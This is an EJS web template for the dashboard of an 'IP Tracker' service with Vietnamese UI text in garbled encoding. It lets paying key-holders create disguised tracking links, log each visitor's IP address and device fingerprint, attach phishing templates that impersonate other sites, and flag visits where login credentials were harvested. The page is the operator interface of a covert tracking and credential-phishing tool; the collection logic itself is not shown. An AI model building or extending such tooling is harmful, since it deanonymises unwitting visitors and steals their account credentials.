<%- include('partials/header_vietnamese') %>

<nav>
  <ul><li><strong>IP Tracker</strong> by Gemlogin Tool (TuanHaii)</li></ul>
  <ul>
    <li><a href="/key" role="button" class="contrast">Qu·∫£n l√Ω Key</a></li>
    <li><details role="list" dir="rtl"><summary aria-haspopup="listbox" role="link"><img src="<%= user.avatar %>" alt="Avatar" style="width: 32px; height: 32px; border-radius: 50%; vertical-align: middle;"> <%= user.username %></summary><ul role="listbox"><li><a href="/auth/logout">ƒêƒÉng xu·∫•t</a></li></ul></details></li>
  </ul>
</nav>

<div id="toast-container" style="position: fixed; top: 20px; right: 20px; z-index: 9999;"></div>

<% if (!hasActiveKey) { %><div class="toast error" style="margin-top:1rem;">Key c·ªßa b·∫°n ch∆∞a ƒë∆∞·ª£c k√≠ch ho·∫°t ho·∫∑c ƒë√£ h·∫øt h·∫°n. Vui l√≤ng v√†o trang <b>Qu·∫£n l√Ω Key</b>.</div><% } %>
<% if (status) { %><% if (status.startsWith('captcha')) { %><div class="toast error" style="margin-top:1rem;"><strong>L·ªói:</strong> X√°c th·ª±c Captcha th·∫•t b·∫°i.</div><% } else if (status === 'link_created') { %><div class="toast success" style="margin-top:1rem;"><strong>Th√†nh c√¥ng:</strong> ƒê√£ t·∫°o li√™n k·∫øt m·ªõi!</div><% } else if (status === 'settings_saved') { %><div class="toast success" style="margin-top:1rem;"><strong>Th√†nh c√¥ng:</strong> ƒê√£ l∆∞u c√†i ƒë·∫∑t!</div><% } %><% } %>

<fieldset <%= !hasActiveKey ? 'disabled' : '' %> >
  <hgroup><h2>T·∫°o li√™n k·∫øt theo d√µi m·ªõi</h2><p>Gi·∫£i Captcha ƒë·ªÉ k√≠ch ho·∫°t n√∫t "T·∫°o li√™n k·∫øt".</p></hgroup>
  <form action="/create-link" method="POST"><input type="url" name="targetUrl" placeholder="https://url-dich-cua-ban.com" required><div class="h-captcha" data-sitekey="<%= hcaptcha_site_key %>" data-callback="onLinkCaptchaSuccess" data-expired-callback="onLinkCaptchaExpired"></div><button id="create-link-btn" type="submit" disabled>T·∫°o li√™n k·∫øt</button></form>
</fieldset>
<hr>

<h2>Li√™n k·∫øt & K·∫øt qu·∫£ c·ªßa b·∫°n</h2>
<small><em>C√°c li√™n k·∫øt kh√¥ng c√≥ l∆∞·ª£t truy c·∫≠p trong 2 ng√†y s·∫Ω t·ª± ƒë·ªông b·ªã x√≥a.</em></small>

<% if (links.length === 0) { %><p style="margin-top: 1rem;">B·∫°n ch∆∞a t·∫°o li√™n k·∫øt n√†o.</p><% } else { %>
    <% links.forEach(link => { %>
        <article>
            <header style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem;">
                <div><strong>Li√™n k·∫øt:</strong> <code style="cursor: pointer;" onclick="copyAndToast('<%= baseUrl %>/t/<%= link.shortId %>')"><%= baseUrl %>/t/<%= link.shortId %></code></div>
                <div style="display:flex; gap: 0.5rem;">
                    <a href="/link/settings/<%= link.shortId %>" role="button" class="contrast" style="padding: 5px 10px; margin: 0; white-space: nowrap;">C√†i ƒë·∫∑t</a>
                    <form action="/delete-link/<%= link.shortId %>" method="POST" onsubmit="return confirm('B·∫°n c√≥ ch·∫Øc mu·ªën x√≥a li√™n k·∫øt n√†y v√† t·∫•t c·∫£ k·∫øt qu·∫£ kh√¥ng?');" style="margin:0;"><button type="submit" class="secondary outline" style="padding: 5px 10px; margin: 0; white-space: nowrap;">X√≥a</button></form>
                </div>
            </header>
            <p style="overflow-wrap: break-word; margin-bottom: 0.5rem;"><strong>ƒê√≠ch:</strong> <a href="<%= link.targetUrl %>" target="_blank" rel="noopener noreferrer"><%= link.targetUrl %></a></p>
            <% if (link.phishTemplate) { %><small><strong style="color:var(--pico-color-red-400)">‚ö†Ô∏è Gi·∫£ m·∫°o: <%= link.phishTemplate %></strong></small><% } %>
            
            <% if (link.Visits && link.Visits.length > 0) { %>
                <div class="overflow-auto" style="margin-top: 1rem;">
                    <table>
                        <thead>
                            <tr>
                                <th>ID Thi·∫øt b·ªã</th>
                                <th>ƒê·ªãa ch·ªâ IP</th>
                                <th>Th·ªùi gian</th>
                                <th style="text-align: right;">H√†nh ƒë·ªông</th>
                            </tr>
                        </thead>
                        <tbody>
                            <% link.Visits.forEach(visit => { %>
                                <tr id="visit-row-<%= visit.id %>">
                                    <td>
                                        <code><%= visit.fingerprintId %></code>
                                        <!-- ICON B√ÅO C√ì CREDENTIALS -->
                                        <% if(visit.Credential) { %> <span title="L∆∞·ª£t truy c·∫≠p n√†y ch·ª©a th√¥ng tin ƒëƒÉng nh·∫≠p ƒë√£ thu th·∫≠p">üîí</span> <% } %>
                                    </td>
                                    <td><%= visit.ipAddress %></td>
                                    <td><%= new Date(visit.timestamp).toLocaleString('vi-VN') %></td>
                                    <td style="text-align: right; white-space: nowrap;">
                                        <a href="<%= hasActiveKey ? '/details/' + visit.id : '#' %>" role="button" class="contrast" <%= !hasActiveKey ? 'aria-disabled="true"' : '' %> onclick="<%= !hasActiveKey ? "showToast('Vui l√≤ng k√≠ch ho·∫°t Key ƒë·ªÉ xem chi ti·∫øt.', 'error'); return false;" : "" %>" style="padding: 5px 10px; margin:0 5px 0 0;">Chi ti·∫øt</a>
                                        <a href="#" role="button" class="secondary" style="padding: 5px 10px; margin:0;" onclick="deleteVisit(event, '<%= visit.id %>')">X√≥a</a>
                                    </td>
                                </tr>
                            <% }) %>
                        </tbody>
                    </table>
                </div>
            <% } else { %> <p style="margin-top: 1rem;"><em>Ch∆∞a c√≥ l∆∞·ª£t truy c·∫≠p.</em></p> <% } %>
        </article>
    <% }) %>
<% } %>

<!-- MODAL ƒê√É ƒê∆Ø·ª¢C X√ìA HO√ÄN TO√ÄN -->

<%- include('partials/footer_vietnamese') %>

<!-- SCRIPT KH√îNG C√íN H√ÄM showCredentials N·ªÆA -->
<script>
    const createLinkBtn = document.getElementById('create-link-btn');
    function onLinkCaptchaSuccess(token) { if(createLinkBtn) createLinkBtn.disabled = false; }
    function onLinkCaptchaExpired() { if(createLinkBtn) createLinkBtn.disabled = true; }

    function showToast(message, type = 'success') {
        const container = document.getElementById('toast-container');
        if (!container) return;
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        const typeText = type === 'success' ? 'Th√†nh c√¥ng' : (type === 'error' ? 'L·ªói' : 'Th√¥ng b√°o');
        toast.innerHTML = `<strong>${typeText}:</strong> ${message}`;
        toast.style.marginBottom = "10px";
        container.appendChild(toast);
        setTimeout(() => {
            toast.style.opacity = '0';
            toast.style.transition = 'opacity 0.5s ease';
            setTimeout(() => toast.remove(), 500);
        }, 3500);
    }
    function copyAndToast(text){
        navigator.clipboard.writeText(text).then(() => {
            showToast('ƒê√£ sao ch√©p v√†o b·ªô nh·ªõ t·∫°m!', 'success');
        }).catch(err => { showToast('Sao ch√©p th·∫•t b·∫°i!', 'error'); });
    }
    async function deleteVisit(event, visitId) {
        event.preventDefault();
        if (!confirm('B·∫°n c√≥ ch·∫Øc mu·ªën x√≥a k·∫øt qu·∫£ n√†y kh√¥ng?')) return;
        try {
            const response = await fetch(`/delete-visit/${visitId}`, { method: 'POST' });
            const result = await response.json();
            if (result.success) {
                document.getElementById(`visit-row-${visitId}`)?.remove();
                showToast('ƒê√£ x√≥a k·∫øt qu·∫£ th√†nh c√¥ng.', 'success');
            } else {
                showToast(result.message || 'Kh√¥ng th·ªÉ x√≥a k·∫øt qu·∫£.', 'error');
            }
        } catch (error) {
            showToast('ƒê√£ x·∫£y ra l·ªói khi c·ªë g·∫Øng x√≥a k·∫øt qu·∫£.', 'error');
        }
    }
</script>
